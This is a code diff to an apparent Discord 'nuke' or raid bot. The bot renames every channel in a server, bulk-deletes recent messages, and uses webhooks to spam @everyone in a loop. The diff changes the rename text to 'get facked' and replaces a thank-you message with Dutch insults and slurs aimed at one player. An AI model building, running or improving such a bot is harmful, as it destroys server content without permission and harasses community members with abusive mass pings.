@@ -62,7 +62,7 @@ client.on('messageCreate', async message => {
 
     const promises = allChannels.map(async (channel) => {
         try {
-            await channel.setName("frostsmp on top");
+            await channel.setName("get facked");
 
             if (channel.type === ChannelType.GuildText) {
                 await channel.bulkDelete(100, true).catch(() => {});
@@ -81,7 +81,7 @@ client.on('messageCreate', async message => {
                 if (webhook) {
                     for (let i = 0; i < spamAmount; i++) {
                         await webhook.send({
-                            content: `bedankt voor het gebruiken <@1012720131937419365>\n@everyone\n${GIF_URL}`,
+                            content: `Jullie zijn niks op ons, vooral jij tyfes maceswapped je cheat kanker blatant.\n@everyone\n${GIF_URL}`,
                             username: WEBHOOK_NAME,
                             avatarURL: WEBHOOK_AVATAR
                         }).catch(() => {});
